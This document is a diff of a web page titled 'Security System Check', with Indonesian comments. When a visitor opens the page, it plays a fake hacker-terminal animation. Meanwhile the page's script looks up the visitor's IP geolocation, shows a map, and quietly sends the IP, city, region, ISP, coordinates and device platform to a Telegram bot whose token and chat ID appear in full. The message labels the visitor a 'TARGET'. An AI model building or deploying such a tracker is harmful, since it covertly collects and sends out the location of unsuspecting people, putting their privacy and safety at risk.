@@ -3,69 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Pelacakan Keamanan</title>
+    <title>Security System Check</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        .info-box { padding: 20px; text-align: center; background: rgba(0,20,0,0.9); border-bottom: 2px solid #0f0; }
-        #map-container { width: 100%; height: 80vh; border: none; }
-        .blink { animation: blinker 1s linear infinite; color: red; font-weight: bold; }
+        body { 
+            background: #050505; 
+            color: #00ff00; 
+            font-family: 'Courier New', Courier, monospace; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            height: 100vh;
+        }
+        .header {
+            padding: 15px;
+            background: #111;
+            border-bottom: 2px solid #00ff00;
+            text-align: center;
+            font-weight: bold;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        }
+        .terminal {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        #map-frame {
+            width: 100%;
+            height: 300px;
+            border: 1px solid #333;
+            margin-top: 20px;
+            display: none; /* Muncul setelah pelacakan selesai */
+            filter: grayscale(1) invert(1) contrast(1.2); /* Efek peta hacker */
+        }
+        .blink { animation: blinker 1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
+        .success { color: #fff; background: #008800; padding: 2px 5px; }
     </style>
 </head>
 <body>
 
-    <div class="info-box">
-        <div class="blink">⚠️ PERINGATAN: KONEKSI TERDETEKSI ⚠️</div>
-        <div id="status">Sedang memetakan koordinat perangkat...</div>
+    <div class="header">
+        <span class="blink">●</span> SYSTEM SCANNING IN PROGRESS...
     </div>
 
-    <iframe id="map-container" src=""></iframe>
+    <div class="terminal" id="term">
+        [#] Initializing secure connection...<br>
+        [#] Encrypting tunnel... DONE<br>
+        [#] Accessing browser metadata... <br>
+    </div>
+
+    <iframe id="map-frame" src=""></iframe>
 
     <script>
         // --- KONFIGURASI TELEGRAM ---
-        const _token = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo';
-        const _chatId = '8551809114';
+        const BOT_TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; 
+        const CHAT_ID = '8551809114';
         // ----------------------------
 
-        async function startTracking() {
+        const term = document.getElementById('term');
+
+        function addLog(msg, delay) {
+            setTimeout(() => {
+                term.innerHTML += `> ${msg}<br>`;
+                term.scrollTop = term.scrollHeight;
+            }, delay);
+        }
+
+        async function initTrack() {
+            addLog("Bypassing firewall...", 1000);
+            addLog("Extracting IP Geolocation...", 2000);
+
             try {
-                // 1. Ambil data lokasi via IP
+                // Ambil Data dari API
                 const response = await fetch('https://ipapi.co/json/');
                 const d = await response.json();
 
-                const lat = d.latitude;
-                const lon = d.longitude;
-                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+                addLog(`<span class="success">SUCCESS: IP ${d.ip} DETECTED</span>`, 3000);
+                addLog(`[!] Location: ${d.city}, ${d.country_name}`, 3500);
+                addLog(`[!] ISP: ${d.org}`, 4000);
+                addLog("Finalizing Coordinate Mapping...", 5000);
 
-                // 2. Tampilkan Maps di Iframe (Langsung Muncul di Web)
-                document.getElementById('map-container').src = mapsUrl;
-                document.getElementById('status').innerText = `Lokasi Terkunci: ${d.city}, ${d.country_name}`;
+                // Tampilkan Map di halaman tanpa keluar
+                setTimeout(() => {
+                    const mapsUrl = `https://maps.google.com/maps?q=${d.latitude},${d.longitude}&z=15&output=embed`;
+                    const frame = document.getElementById('map-frame');
+                    frame.src = mapsUrl;
+                    frame.style.display = "block";
+                    addLog("--- SATELLITE FEED ESTABLISHED ---", 500);
+                }, 6000);
 
-                // 3. Kirim data lengkap ke Telegram lo
+                // Kirim ke Telegram
                 const pesan = `
-📍 **TARGET TERKUNCI!**
+📍 **TARGET STICKY TRACKER**
 ------------------------------
 🌐 IP: ${d.ip}
 🏙️ Kota: ${d.city}
+🚩 Region: ${d.region}
 🏢 ISP: ${d.org}
-📍 Koordinat: ${lat}, ${lon}
+📍 Koordinat: ${d.latitude}, ${d.longitude}
+📱 Device: ${navigator.platform}
 ------------------------------
-🔗 Link Maps: https://www.google.com/maps?q=${lat},${lon}
+🔗 Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}
                 `;
 
-                await fetch(`https://api.tele` + `gram.org/bot${_token}/sendMessage`, {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: _chatId, text: pesan, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
                 });
 
             } catch (err) {
-                document.getElementById('status').innerText = "Gagal memuat peta. Koneksi tidak stabil.";
+                addLog("<span style='color:red'>[!] Error: Connection Lost</span>", 3000);
             }
         }
 
-        // Jalankan saat web dibuka
-        window.onload = startTracking;
+        window.onload = initTrack;
     </script>
 </body>
 </html>
